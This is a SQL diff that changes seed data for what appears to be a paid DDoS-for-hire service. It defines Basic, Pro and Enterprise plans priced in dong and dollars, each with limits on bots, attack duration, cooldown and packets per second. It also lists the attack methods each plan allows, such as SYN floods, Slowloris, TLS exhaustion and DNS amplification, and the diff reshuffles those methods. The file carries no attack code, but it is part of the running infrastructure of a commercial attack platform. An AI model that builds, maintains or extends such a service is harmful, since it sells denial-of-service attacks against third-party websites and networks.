@@ -172,6 +172,6 @@ INSERT INTO users (username, email, password_hash, role) VALUES
 
 -- Plans
 INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
-('Basic',     'basic',     'Dành cho người mới: 1 bot, 60s, UDP/TCP',               1,  1,   60, 300, 100000,  '{UDP,TCP}',                              50000,   5.00),
-('Pro',       'pro',       'Dành cho tester: 5 bot, 180s, đầy đủ method',           5,  3,  180, 120, 500000,  '{UDP,TCP,HTTP,SYN,ICMP,MIX}',             150000, 15.00),
-('Enterprise','enterprise','Dành cho team: 20 bot, 600s, MEGA mode',                 20, 10, 600,  30, 2000000, '{UDP,TCP,HTTP,SYN,ICMP,MIX,SLOWLORIS,TLS_EXHAUST,DNS_AMP,GAME_MIMIC,MEGA}', 500000, 50.00);
+('Basic',     'basic',     'Dành cho người mới: 1 bot, 60s, UDP',                  1,  1,   60, 300, 100000,  '{UDP,MEGA}',                             50000,   5.00),
+('Pro',       'pro',       'Dành cho tester: 5 bot, 180s, đầy đủ method',           5,  3,  180, 120, 500000,  '{UDP,MEGA,SYN,HTTP}',                    150000, 15.00),
+('Enterprise','enterprise','Dành cho team: 20 bot, 600s, full method',              20, 10, 600,  30, 2000000, '{UDP,MEGA,SYN,TLS_EXHAUST,HTTP,SLOWLORIS,DNS_AMP}', 500000, 50.00);
